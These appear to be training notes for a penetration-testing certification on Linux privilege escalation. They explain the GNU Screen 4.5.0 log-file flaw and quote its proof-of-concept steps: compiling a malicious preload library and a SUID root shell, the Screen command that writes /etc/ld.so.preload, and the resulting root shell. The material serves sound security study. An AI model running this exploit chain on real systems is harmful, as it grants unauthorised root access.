## 1. What Are Vulnerable Services?

During privilege escalation, you may discover **services with known vulnerabilities** that can be exploited to gain higher privileges.

The important idea is:

```text
Service running
      ↓
Identify software + version
      ↓
Check for known vulnerability
      ↓
Determine exploitability
      ↓
Exploit
      ↓
Privilege escalation
```

A key example is **GNU Screen 4.5.0**, which has a local privilege-escalation vulnerability caused by insufficient permission checking when opening a log file.

---

# 2. Screen Version Identification

First identify the installed Screen version:

```bash
screen -v
```

Example:

```text
Screen version 4.05.00 (GNU) 10-Dec-16
```

The version shown as:

```text
4.05.00
```

corresponds to **Screen 4.5.0**.

### CPTS mindset

When you discover a suspicious service/binary:

```text
Name → Version → Vulnerability → Exploit
```

Don't immediately run an exploit.

First establish:

```text
What is it?
Which version?
Is it vulnerable?
What privileges does it have?
Can the vulnerability cross the current privilege boundary?
```

---

# 3. GNU Screen 4.5.0 Vulnerability

The vulnerable Screen version has a privilege-escalation flaw related to **log file handling**.

The vulnerability can allow an attacker to:

- truncate files
    
- create files owned by `root`
    
- ultimately obtain full root access
    

### Attack concept

```text
Screen 4.5.0
     │
     ↓
Improper permission check
     │
     ↓
Manipulate privileged file
     │
     ↓
/etc/ld.so.preload
     │
     ↓
Malicious shared library loaded
     │
     ↓
Root-owned SUID shell
     │
     ↓
root
```

---

# 4. Key Concept — `/etc/ld.so.preload`

The exploit abuses the dynamic linker configuration file:

```text
/etc/ld.so.preload
```

This file can specify shared libraries that are loaded into processes.

The exploit's goal is essentially:

```text
Write malicious library path
        ↓
/etc/ld.so.preload
        ↓
Privileged Screen process loads library
        ↓
Library constructor executes
        ↓
Create privileged shell
```

---

# 5. Exploit Components

The supplied exploit creates **two main components**:

```text
/tmp/libhax.so
        +
/tmp/rootshell
```

### `libhax.so`

A malicious shared library.

It contains a constructor:

```c
__attribute__ ((__constructor__))
void dropshell(void)
```

A constructor function executes automatically when the shared library is loaded.

The function:

```text
chown("/tmp/rootshell", 0, 0)
```

makes the shell owned by root.

Then:

```text
chmod("/tmp/rootshell", 04755)
```

sets the SUID bit.

Finally:

```text
unlink("/etc/ld.so.preload")
```

removes the preload file.

---

# 6. `rootshell`

The exploit also compiles:

```text
/tmp/rootshell
```

Its purpose is to become a root shell.

The program calls:

```c
setuid(0);
setgid(0);
seteuid(0);
setegid(0);
```

Then executes:

```text
/bin/sh
```

Conceptually:

```text
rootshell
   │
   ├── UID = 0
   ├── GID = 0
   ├── EUID = 0
   └── EGID = 0
          ↓
       /bin/sh
```

---

# 7. Exploit Flow

The important part of the supplied POC is:

```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

This compiles the malicious shared library.

Then:

```bash
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
```

This creates the shell binary.

The exploit then moves to:

```bash
cd /etc
```

and sets:

```bash
umask 000
```

The critical Screen command is:

```bash
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
```

The exploit uses Screen's logging functionality to create/manipulate:

```text
/etc/ld.so.preload
```

containing:

```text
/tmp/libhax.so
```

The newline is required by the exploit.

---

# 8. Triggering the Exploit

The POC then executes:

```bash
screen -ls
```

The comment in the exploit explains the reasoning:

```text
screen itself is setuid
```

Therefore, when the vulnerable Screen binary loads the malicious library:

```text
Screen
  │
  ↓
loads /tmp/libhax.so
  │
  ↓
constructor executes
  │
  ├── chown rootshell → root
  ├── chmod 04755
  └── remove ld.so.preload
```

The resulting `/tmp/rootshell` becomes a **root-owned SUID executable**.

---

# 9. Final Step

The exploit executes:

```bash
/tmp/rootshell
```

Because the file has:

```text
04755
```

the SUID bit is set.

Conceptually:

```text
/tmp/rootshell
      │
      ├── Owner: root
      └── SUID
           ↓
    Execute as root
           ↓
       /bin/sh
           ↓
      uid=0(root)
```

The supplied example ends with:

```text
# id
uid=0(root) gid=0(root) groups=0(root),...
```

---

# 10. Full Attack Chain

```text
Low-privileged user
        │
        ↓
Identify Screen
        │
        ↓
screen -v
        │
        ↓
Version 4.05.00
        │
        ↓
Known Screen 4.5.0 vulnerability
        │
        ↓
Abuse Screen logging
        │
        ↓
Write /etc/ld.so.preload
        │
        ↓
/tmp/libhax.so
        │
        ↓
Privileged Screen loads library
        │
        ↓
Library constructor executes
        │
        ├───────────────┐
        ↓               ↓
chown rootshell    chmod 04755
root:root          SUID
        └───────┬───────┘
                ↓
         /tmp/rootshell
                ↓
             root shell
```

---

# 11. CPTS Enumeration Methodology — Vulnerable Services

When looking for vulnerable services during Linux PrivEsc:

### Step 1 — Enumerate services

```bash
ps aux
```

Also inspect:

```bash
systemctl
```

and listening ports:

```bash
ss -tulpn
```

### Step 2 — Identify versions

For suspicious binaries:

```bash
<binary> --version
```

or:

```bash
<binary> -v
```

Example:

```bash
screen -v
```

### Step 3 — Research the exact version

```text
Software
   ↓
Exact version
   ↓
Known CVE / vulnerability
   ↓
Local or remote?
   ↓
Required privileges?
   ↓
Exploit
```

### Step 4 — Determine privilege context

Ask:

```text
Who owns the process?
What user does it run as?
Is it SUID?
Does it interact with privileged files?
Does it run as root?
```

---

# 🔥 CPTS Must-Know

### Vulnerable service workflow

```text
ENUMERATE
    ↓
IDENTIFY
    ↓
VERSION
    ↓
RESEARCH
    ↓
VALIDATE
    ↓
EXPLOIT
    ↓
PRIVESC
```

### Commands

```bash
screen -v
```

```bash
ps aux
```

```bash
ss -tulpn
```

### Screen 4.5.0 key vulnerability

```text
Screen 4.5.0
    ↓
Improper permission checking
    ↓
Log-file abuse
    ↓
/etc/ld.so.preload manipulation
    ↓
Malicious shared library
    ↓
Root-owned SUID shell
    ↓
ROOT
```

### Remember this connection

This technique combines several concepts you've already studied:

```text
Vulnerable Service
       +
SUID Screen
       +
Privileged File
       +
Dynamic Library Loading
       +
SUID rootshell
       ↓
Privilege Escalation
```

**CPTS takeaway:** Finding a running service isn't enough. **The version and privilege context are what turn a service into a potential privilege-escalation path.**